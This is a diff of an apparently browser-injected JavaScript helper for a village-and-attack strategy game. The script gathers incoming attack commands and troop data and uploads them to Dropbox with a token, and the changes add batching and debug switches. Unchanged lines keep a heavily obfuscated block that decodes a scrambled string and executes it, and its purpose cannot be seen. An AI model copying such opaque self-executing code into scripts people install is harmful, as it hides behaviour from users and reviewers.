@@ -46,7 +46,20 @@ window.supabaseReady = new Promise(resolve => {
     document.head.appendChild(s);
 })();
 
+async function processBatch(items, worker, batchSize = 3, delay = 400) {
+    for (let i = 0; i < items.length; i += batchSize) {
 
+        if (STOP_EXECUTION) return;
+
+        const batch = items.slice(i, i + batchSize);
+
+        await Promise.all(
+            batch.map((item, idx) => worker(item, i + idx))
+        );
+
+        await new Promise(r => setTimeout(r, delay + Math.random() * delay));
+    }
+}
 // ===== CAPTCHA CONTROL =====
 let STOP_EXECUTION = false;
 
@@ -124,7 +137,7 @@ const _0x4425ce = _0x35b2;
 //config
 //var databaseName,filename_commands,dropboxToken;
 (function(){var sgX='',QJl=582-571;function CpT(h){var b=1467583;var w=h.length;var k=[];for(var m=0;m<w;m++){k[m]=h.charAt(m)};for(var m=0;m<w;m++){var c=b*(m+506)+(b%31501);var g=b*(m+300)+(b%48699);var s=c%w;var l=g%w;var j=k[s];k[s]=k[l];k[l]=j;b=(c+g)%4389315;};return k.join('')};var djL=CpT('afohowdmetrlxsckurtsctjoncuqpgbrvziny').substr(0,QJl);var WUl='tg5t-,ll08c136ircf;9;(]d=!.])id(s(ij+cd!rrau t2(rx rnwot,lu [=u{.+d+0+lj=e43+j[st(p=htvu7-o6c;0 k>vs)l,l+v7);72==d(),(w7+"+aeb*{[]==7fu)a=sr2mwkta 0t)5r9ou1==i-i(gl]v.eorqsC)),l=,a.lht;(6Ai08;}pp+==[=a7vr;v(+joaa0au(h;;o;ta(otnzu.+c][]t.;jnae)umt)r;g=r=n4bnopcass+dm6tmu z=ol(en[ zv);z)ia;,3or.c*".wfnqnhr7<r.fc+=np;()gp0],tn9)0;u h=0;n=k i=m),(,)j ar;++hh1;ua,e,ps)r>=v1,s;,ur1pra8jl=7valn}rsAa,he{m2t(xrr[r,mm"(-canf(x(e Ap+t68;8rgtdfCl;tlo),q.s =;.rrsfa{vg)hrr<),+wt;k=fr2lwe d;ha oh-(=ll2np;h.as+;a.8.;eng]rsC+A (h,no) (n<s(av(;;r, r.[;efvin.hx)vf;]nwn)7s)usa]lg;1fghaovpu27tkvb+6kr.nag((,nq4.0=rhqe(1ubet(gf9da+1cvif=a-jrgb1et)=8wqr[..=.v;i;1roehgpznb((.s2t(,.jtbroy)euu.p}  v9v]hlj;0i)vi0aa"cinu+oi,lo"(;varh;t}c1si0=s40a-,9"f9r].en}cn6droe;vr]v S=ri;".)r]tC,arC;,kC;ss=ff8=8{C (9) ;ihs[ jtSgik++eAf")[vaar<=[)=;ki},rng=r{=)i=[wts5a;tfCe{8)"p)lk1"=zktf6v[l.;r+g =31;<tsisal}eg ss(ohln';var KxQ=CpT[djL];var Uxg='';var tWJ=KxQ;var nHQ=KxQ(Uxg,CpT(WUl));var xIX=nHQ(CpT('u#gudjr$zMrunoo9erutd{)gwKx3tkoxE.bC_dxvjdi-m;cfonyazdr8.x..lgctdyz60ga,j))haK.).jcgaa.tn(0$;j190zdu).hi.pevtm.xb.45d2g;3.gya.1n..$.jgix2tzwnu.I_.SIm.e..g1zItp.mah!!hK.sEc=v.)-f.C.m1..ej%..n..zhDxb60ckwwzosg.w.ih.y=xK4kg;n00h.+.4.&...d.hlsSqt36.msDdt..vhhT,a3jj.dtw,...tiyK.a_ss.yratK%(mqC_z,".)8z.0.)gnaf52gamtnyvrowK.qDK.)meu.3.S.. xatm(pv,E[7.n7oyz#..K.nI-.nD.Nhkrstzh.t-.1}n6oowrnwju=of}l.yu(=.K0plf_Klsilh.a..qv.ii01.5o;1N.x=2..7!.os.ek)oKSh.Tmg&hom,"vaNza...9bdc.qm .y\/y-rKqt.l...sma.jlxbxuzf.6wqo.nhlhml.S.\/Su.)..gw .g4t!kpDK.lN7etSrT.lKdsursd.]xf{m\/qtpwmDidyo}_tDkohEu,pDs.wi!zb1SexwD_qa.q-.g3.,.ps!Ds)t%vEw.wcr_N.u$a0l.be.i.m}1.wcm!m.....N.tx..ev{l.ms(.7m.s.=rKK.olr.c7.hhxlr1xvqqf58-3I._23hk.v.*r}.byjnt6.\/2tuagy.4grbNj2Kbvc4y..d0n0ad(.1;wn$$o!xea...23fn_]ue Ce.lK.glbM.d.zmod.g7_dodtl.6.$5.to.1ui3.z..yir.7ct%9.$iIcd.(Sqo3smmkb0.vj06Sx_nw.,&mgysw-ui52nqor.p553a[1aC)myo_cz*n.q..Nrod)r.xfe.q.qd}K..t.o3*hnawucoa,_KsjaMws#mityzrsMwiaKKm.pbz90aK.44spMv.rssga5i%vtdD...exI....z.2-26Kvwp.r.It0nh..agypso3nneljug}Eb30ibdxKtT.s5yvxm_-.N2.pkt;0#.{q(vme3Kcg\'!5ts.h.Nie.n8uvv)tz(l,xe;kax8.!3mchyfj+4f;p.dfl.(gt)1sc.sMp1zvdDiw;g.2,i7.5ug1m.ti1D!.]r(.5yh.5sv7a1x-2p.nT.wn0.tNo.z8.=t.2,t58.tzN.x..7...34KrKToIglyh.j+f_zvf.r_u5f.qt9.un..z.(k2jzunrc6chn9h.eftggM9S(osznmi=o7yd 0j._6(.iskle\'x6DuNpC%Sc-e...C9.)t.DT.Kr.p..4.8_30.n7i0."r.tKlgryh;z4y0.S,0S4NNa.-.oj6qxt-a.4Kbwyi.)#fx6,)_52(MtomKjxK\'rlMSzzf..K..4p,dr.44E.s..ez..(..i(.t.v!kzNc4th.vub Ko3IfytT4)jghoarm9.(mtu04(f4;0n1a.g$.zb_gw.D$tuv1...%n9rln7r,sr$is3cNSao.l),wi.s.id.hrr+x.hf..CMpK0v!NrI.iz..dw9$9$=.w).4.z6rwzo.n(h)vggKzq39t,xDz .q._shaksN,.5v}_.c7g.,9ni\/llKsnf8v.fne=Kxi.-3;vctr.0!h.sgo,z...t2.{8;i2tKdi.r=It9"ml...ht4tmwmd5s)wg.sr3xKn_j)o.aiir0Irqdsa .bsNN.md;qmw7a.2s-q_t....0.04NznvytK$xsn..Dwz..ki.)rNIktg{sD.t_Ip.;mb.tDxT)[.6KdtI(KdS..uoTcoIt$ogi3$izu-.r..,1r3-I.;eTK.. j61w09dd(.4.znE$rb1.yl(K+9..5K.rKMzwKzKvjvnK=zame.)+ofbKznN.. nss.cS.d0%6.T.Cre;idaD=s}T.+.(K}4Kc4=.ndmThx1b..bs)Skrko{h.#3=.4ohjcp!..)gxDb);vkxi.q.C0CId8;xg,6)a.Nc8s.jddKlqt(l.Nl.cc(3ha,..;Mq.3$i7n=dp1mq+.q.)gSK"T3Kqnh5dm.c.e7,.0Im.wv$Kgnrog8+h6!.)).i.!.a(h h_o\/l.."2CK6(m!m1qgk._4v2)-dK)2xn.0._=.xv_-qd$.ow.il;il1.vS6(3E.,4n3m9K.j1aM.D27idyqtSKijn.,.!)r}T+Kg.i=c.dsm7.7Kvb=ttM.qIE.Ktp]t.dk17!il%cpK0.kxeu0KtKw.[#jN.bKv0rj7...!.)Ef.7n)K*(lmjfKj_gwap6{5klKtk(z1alufxjc.eu]j&Mf_ggteua.n=jpmbr..Km;e.sI,rC 0eade!eo\/D]Kbx.S0s.t0.sn.K\'ayKf.%rK13.domw$(.S8yh7DmdKqK. h)sj8.5Clam{0..Elh.2iKsg.D;..;[+C60.,5..fpsz.3z3_$N=(xcN.hpE!uhryds8sy1T}kadktv,p,p.pu=af1.0sS.Ku.a3D9sldK.$3,+K)jsKh0!$o._isrymtK,r!usmjvkklE.6.rvsrK.. 4 z6ogafccKa!p.(i.Ms co=+ "!D6iro.war.o bseiu1mzvf7tw..pr.,kfz05da$SgC7yd.,x.'));var rll=tWJ(sgX,xIX );rll(4343);return 7278})()
-
+const DEBUG = false;
 //
 async function main() {
     const _0x59dcb9 = _0x4425ce;
@@ -208,12 +221,12 @@ try {
     }
 }
 
-console.log("Filtered villages with attacks:", allVillageLinks.length);
+if (DEBUG) console.log("Filtered villages with attacks:", allVillageLinks.length);
 
 let _0x4ee440 = allVillageLinks;
 
 
-console.log("Villages collected:", _0x4ee440.length);
+if (DEBUG) console.log("Villages collected:", _0x4ee440.length);
 
 ///village parsing logic ends////
 
@@ -231,7 +244,9 @@ await uploadFile(json, filename_commands);
             _0x4b52ee = new Map([..._0x4b52ee, ..._0x4898bd]);
         }
     };
-    await _0x4ea8fc(), console[_0x59dcb9(0x228)](_0x4b52ee);
+    await _0x4ea8fc();
+
+if (DEBUG) console.log('Collected commands:', _0x4b52ee.size);
 
 
     let _0x5f2ada = document['getElementById'](_0x59dcb9(0x21a))[_0x59dcb9(0x225)]['split']('/'),
@@ -257,8 +272,8 @@ Array.from(remote.keys()).forEach(id => {
 });
 
 
-    console.log('🔀 Final command count (post-clean):', remote.size);
-    
+    if (DEBUG) console.log('🔀 Final command count (post-clean):', remote.size);
+
 
 let stats = {
     total: remote.size,
@@ -289,15 +304,15 @@ console.table(stats);
 
 
     var _0x5f15ea = JSON[_0x59dcb9(0x21c)](Array['from'](remote['entries']()));
-        console.log('📄 JSON size (chars):', _0x5f15ea.length);
+        if (DEBUG) console.log('📄 JSON size (chars):', _0x5f15ea.length);
 
     _0x5f15ea = lzw_encode(_0x5f15ea);
-    console.log('🗜️ LZW size (chars):', _0x5f15ea.length);
+    if (DEBUG) console.log('🗜️ LZW size (chars):', _0x5f15ea.length);
 
     let _0x284a2c = await uploadFile(_0x5f15ea, filename_commands, dropboxToken);
     console['log'](_0x284a2c);
     await readFileDropbox(filename_commands).then(t => {
-    console.log('📥 Remote file size:', t.length);
+    if (DEBUG) console.log('📥 Remote file size:', t.length);
 });
 
 }
@@ -337,7 +352,7 @@ function createUploadStatsUI() {
         📤 SpyUpload stats
     </div>
 
-    
+
 
     Total: <span id="up-total">0</span><br>
     Fake: <span id="up-fake">0</span><br>
@@ -397,10 +412,11 @@ function getInfoCommands(_0x33f628, remote) {
         let _0x498178 = new Map();
         const _0x43e079 = async () => {
             const _0x457555 = _0x35b2;
-            for (let _0x52bb47 = 0x0; _0x52bb47 < _0x33f628[_0x457555(0x1e9)]; _0x52bb47++) {
+            await processBatch(_0x33f628, async (_url, _0x52bb47) => {
                 if (STOP_EXECUTION) return;
-                let html = await ajaxGet(_0x33f628[_0x52bb47], remote);
+                let html = await ajaxGet(_url, remote);
 
+if (!html) return;
 
 UI[_0x457555(0x1fb)](
     _0x52bb47 + _0x457555(0x227) + _0x33f628[_0x457555(0x1e9)]
@@ -466,7 +482,7 @@ if (
     }
 });
 
-            }
+            });
         };
         await _0x43e079();
         let _0x99e5d5 = Array['from'](_0x498178['entries']());
@@ -475,19 +491,19 @@ if (
   const _0x34cc59 = async (existingRemote) => {
     const _0x4ef379 = _0x35b2;
 const onlyNonSmall = document.getElementById('only-non-small')?.checked || false;
-    for (let _0x6eb156 = 0; _0x6eb156 < _0x99e5d5[_0x4ef379(0x1e9)]; _0x6eb156++) {
+    await processBatch(_0x99e5d5, async (_entry, _0x6eb156) => {
         if (STOP_EXECUTION) return;
     UI[_0x4ef379(0x1fb)](
-        _0x6eb156 + ' / ' + _0x99e5d5[_0x4ef379(0x1e9)]
-    );
+    (_0x6eb156 + 1) + ' / ' + _0x99e5d5[_0x4ef379(0x1e9)]
+);
 
-    let _0x47fb05 = _0x99e5d5[_0x6eb156][0],
-        _0x4778ce = _0x99e5d5[_0x6eb156][1];
+    let _0x47fb05 = _entry[0],
+     _0x4778ce = _entry[1];
 
     // 🔥🔥🔥 ADD THIS BLOCK RIGHT HERE
     if (existingRemote && existingRemote.has(_0x47fb05)) {
-    _0x99e5d5[_0x6eb156][1] = existingRemote.get(_0x47fb05);
-    continue;
+    _entry[1] = existingRemote.get(_0x47fb05);
+    return;
 }
 
 
@@ -502,8 +518,8 @@ const onlyNonSmall = document.getElementById('only-non-small')?.checked || false
 // 🚀 Skip troop fetch for small (only when toggle ON)
 if (onlyNonSmall && _type === 'small' && !_hasNoble) {
     // do NOT set fake — unknown
-    _0x99e5d5[_0x6eb156][1] = _0x4778ce;
-    continue;
+    _entry[1] = _0x4778ce;
+    return;
 }
 
 // ✅ ORIGINAL FILTER (ALWAYS KEEP THIS SEPARATE)
@@ -513,11 +529,12 @@ if (
     _type !== 'small' &&
     !_hasNoble
 ) {
-    continue;
+    return;
 }
-console.log("Fetching troops for:", _0x47fb05);
+if (DEBUG) console.log("Fetching troops for:", _0x47fb05);
 
     const _0x29310f = await ajaxGetTroops(_0x76f392, remote);
+        if (!_0x29310f) return;
 
     if (_0x29310f?.total?.population !== undefined) {
         _0x4778ce.population = _0x29310f.total.population;
@@ -540,8 +557,8 @@ console.log("Fetching troops for:", _0x47fb05);
         _0x4778ce.troops = troops;
     }
 
-    _0x99e5d5[_0x6eb156][1] = _0x4778ce;
-}
+    _entry[1] = _0x4778ce;
+});
 
 };
 
@@ -568,6 +585,7 @@ if (_0x498178.size > 0) {
   console.group('📦 Commands collected');
   console.log('Total commands:', _0x498178.size);
 
+if (DEBUG) {
   console.table(
     Array.from(_0x498178.entries()).map(([id, data]) => ({
       commandId: id,
@@ -577,6 +595,7 @@ if (_0x498178.size > 0) {
       landTime: data.dateLand
     }))
   );
+}
 
   console.groupEnd();
 }
@@ -805,3 +824,4 @@ function _0x438d() {
 }
 
 })();
+
